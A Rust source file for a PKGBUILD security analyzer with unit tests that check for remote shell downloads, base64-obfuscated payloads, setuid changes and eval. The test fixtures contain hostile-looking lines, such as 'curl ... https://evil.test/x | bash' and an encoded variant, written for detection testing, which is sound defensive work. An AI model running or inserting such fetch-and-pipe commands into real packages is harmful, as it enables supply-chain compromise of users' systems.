#[cfg(test)]
mod tests {
    use super::*;
    use base64::Engine;
    use std::fs;
    use tempfile::TempDir;

    fn write_fixture(pkgbuild: &str, install: Option<&str>) -> TempDir {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join("PKGBUILD"), pkgbuild).unwrap();
        if let Some(content) = install {
            fs::write(dir.path().join("hook.install"), content).unwrap();
        }
        dir
    }

    #[test]
    fn clean_pkgbuild_has_no_remote_exec_finding() {
        let dir = write_fixture(
            "pkgname=clean\npkgver=1\nsource=(\"https://example.test/a.tar.gz\")\n",
            None,
        );
        let result = analyze_pkgbuild_dir(dir.path(), &RuleSet::builtin()).unwrap();
        assert!(
            !result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "remote-shell-download")
        );
    }

    #[test]
    fn curl_pipe_bash_is_detected() {
        let dir = write_fixture(
            "pkgname=bad\nbuild() {\n  curl -fsSL https://evil.test/x | bash\n}\n",
            None,
        );
        let result = analyze_pkgbuild_dir(dir.path(), &RuleSet::builtin()).unwrap();
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "remote-shell-download")
        );
    }

    #[test]
    fn encoded_remote_shell_is_detected() {
        let encoded =
            base64::engine::general_purpose::STANDARD.encode(b"curl https://evil.test/x | sh");
        let dir = write_fixture(
            &format!(
                "pkgname=bad\nprepare() {{ echo {} | base64 -d; }}\n",
                encoded
            ),
            None,
        );
        let result = analyze_pkgbuild_dir(dir.path(), &RuleSet::builtin()).unwrap();
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "obfuscated-payload")
        );
    }

    #[test]
    fn multiline_dependency_array_is_parsed() {
        let dir = write_fixture(
            "pkgname=foo\ndepends=(\n  'glibc'\n  \"openssl\"\n)\nmakedepends=(make)\ncheckdepends=(\"check\")\n",
            None,
        );
        let result = analyze_pkgbuild_dir(dir.path(), &RuleSet::builtin()).unwrap();
        assert_eq!(result.depends, vec!["glibc", "openssl"]);
        assert_eq!(result.makedepends, vec!["make"]);
        assert_eq!(result.checkdepends, vec!["check"]);
    }

    #[test]
    fn install_findings_use_install_filename() {
        let dir = write_fixture(
            "pkgname=foo\n",
            Some("post_install() {\n  chmod u+s /usr/bin/tool\n}\n"),
        );
        let result = analyze_pkgbuild_dir(dir.path(), &RuleSet::builtin()).unwrap();
        let finding = result
            .findings
            .iter()
            .find(|finding| finding.rule_id == "setuid-manipulation")
            .unwrap();
        assert_eq!(finding.file, "hook.install");
        assert_eq!(finding.line, 2);
    }

    #[test]
    fn line_numbers_match_source() {
        let dir = write_fixture("pkgname=foo\n\n\neval \"$cmd\"\n", None);
        let result = analyze_pkgbuild_dir(dir.path(), &RuleSet::builtin()).unwrap();
        let finding = result
            .findings
            .iter()
            .find(|finding| finding.rule_id == "eval-invocation")
            .unwrap();
        assert_eq!(finding.line, 4);
    }

    #[test]
    fn install_hash_changes_when_install_file_changes() {
        let dir1 = write_fixture("pkgname=foo\n", Some("post_install() {\n  echo v1\n}\n"));
        let dir2 = write_fixture("pkgname=foo\n", Some("post_install() {\n  echo v2\n}\n"));
        let r1 = analyze_pkgbuild_dir(dir1.path(), &RuleSet::builtin()).unwrap();
        let r2 = analyze_pkgbuild_dir(dir2.path(), &RuleSet::builtin()).unwrap();
        assert_ne!(r1.install_hash, r2.install_hash);
        // PKGBUILD identical, so pkgbuild_hash should match
        assert_eq!(r1.pkgbuild_hash, r2.pkgbuild_hash);
    }

    #[test]
    fn install_scope_tag_on_install_rules() {
        let dir = write_fixture(
            "pkgname=foo\n",
            Some("post_install() {\n  chmod u+s /usr/bin/foo\n}\n"),
        );
        let result = analyze_pkgbuild_dir(dir.path(), &RuleSet::builtin()).unwrap();
        let finding = result
            .findings
            .iter()
            .find(|finding| finding.rule_id == "install-setuid")
            .unwrap();
        assert_eq!(finding.scope, crate::core::types::FindingScope::Install);
    }
}

use super::deobfuscate::findings_from_encoded;
use super::rules::RuleSet;
use crate::core::source_integrity::assess_sources;
use crate::core::types::Finding;
use sha2::{Digest, Sha256};

pub struct PkgbuildAnalysis {
    pub package_name: Option<String>,
    pub version: Option<String>,
    pub depends: Vec<String>,
    pub makedepends: Vec<String>,
    pub checkdepends: Vec<String>,
    pub source_urls: Vec<String>,
    pub findings: Vec<Finding>,
    pub pkgbuild_hash: String,
    pub install_hash: String,
}

#[derive(Debug, thiserror::Error)]
pub enum AnalyzerError {
    #[error("PKGBUILD not found in {0}")]
    MissingPkgbuild(String),
    #[error(transparent)]
    Io(#[from] std::io::Error),
}

pub fn analyze_pkgbuild_dir(
    dir: &std::path::Path,
    rules: &RuleSet,
) -> Result<PkgbuildAnalysis, AnalyzerError> {
    let pkgbuild_path = dir.join("PKGBUILD");
    if !pkgbuild_path.is_file() {
        return Err(AnalyzerError::MissingPkgbuild(dir.display().to_string()));
    }
    let text = std::fs::read_to_string(&pkgbuild_path)?;
    let mut findings = rules.evaluate("PKGBUILD", &text);
    findings.extend(findings_from_encoded("PKGBUILD", &text, rules));
    let mut install_files = Vec::new();
    for entry in std::fs::read_dir(dir)? {
        let path = entry?.path();
        if path.extension().and_then(|value| value.to_str()) == Some("install") {
            let file = path
                .file_name()
                .and_then(|value| value.to_str())
                .unwrap_or_default()
                .to_string();
            let install_text = std::fs::read_to_string(&path)?;
            findings.extend(rules.evaluate(&file, &install_text));
            findings.extend(findings_from_encoded(&file, &install_text, rules));
            install_files.push((file, install_text));
        }
    }
    let mut pkgbuild_hasher = Sha256::new();
    pkgbuild_hasher.update(text.as_bytes());
    let pkgbuild_hash = hex::encode(pkgbuild_hasher.finalize());

    let mut install_hasher = Sha256::new();
    for (_, content) in &install_files {
        install_hasher.update(content.as_bytes());
    }
    let install_hash = hex::encode(install_hasher.finalize());

    let sources: Vec<String> = assignment_array(&text, "source")
        .into_iter()
        .filter(|value| value.contains("://") || value.starts_with("git+"))
        .collect();
    let sha256sums = assignment_array(&text, "sha256sums");
    let has_sha256sums = sha256sums.iter().any(|value| !value.starts_with("SKIP"));
    for assessment in assess_sources(&sources, has_sha256sums) {
        if let Some(finding) = assessment.finding {
            findings.push(finding);
        }
    }

    Ok(PkgbuildAnalysis {
        package_name: assignment_value(&text, "pkgname"),
        version: assignment_value(&text, "pkgver"),
        depends: assignment_array(&text, "depends"),
        makedepends: assignment_array(&text, "makedepends"),
        checkdepends: assignment_array(&text, "checkdepends"),
        source_urls: sources,
        findings,
        pkgbuild_hash,
        install_hash,
    })
}

fn assignment_value(text: &str, key: &str) -> Option<String> {
    let value = assignment_raw(text, key)?;
    let trimmed = value
        .trim()
        .trim_matches(|ch| ch == '(' || ch == ')')
        .trim();
    first_shell_word(trimmed)
}

fn assignment_array(text: &str, key: &str) -> Vec<String> {
    let Some(raw) = assignment_raw(text, key) else {
        return Vec::new();
    };
    let content = raw.trim().trim_start_matches('(').trim_end_matches(')');
    shell_words(content)
}

fn assignment_raw(text: &str, key: &str) -> Option<String> {
    let marker = format!("{}=", key);
    let start = text
        .lines()
        .position(|line| line.trim_start().starts_with(&marker))?;
    let lines: Vec<&str> = text.lines().collect();
    let first = lines[start].trim_start()[marker.len()..].to_string();
    if first.trim_start().starts_with('(') && !first.contains(')') {
        let mut result = first;
        for line in &lines[start + 1..] {
            result.push('\n');
            result.push_str(line);
            if line.contains(')') {
                break;
            }
        }
        Some(result)
    } else {
        Some(first)
    }
}

fn shell_words(text: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut quote = None;
    for ch in text.chars() {
        match quote {
            Some(q) if ch == q => quote = None,
            Some(_) => current.push(ch),
            None if ch == '\'' || ch == '"' => quote = Some(ch),
            None if ch.is_whitespace() => {
                if !current.is_empty() {
                    words.push(std::mem::take(&mut current));
                }
            }
            None if ch == ')' => {
                if !current.is_empty() {
                    words.push(std::mem::take(&mut current));
                }
            }
            None => current.push(ch),
        }
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

fn first_shell_word(text: &str) -> Option<String> {
    shell_words(text).into_iter().next()
}
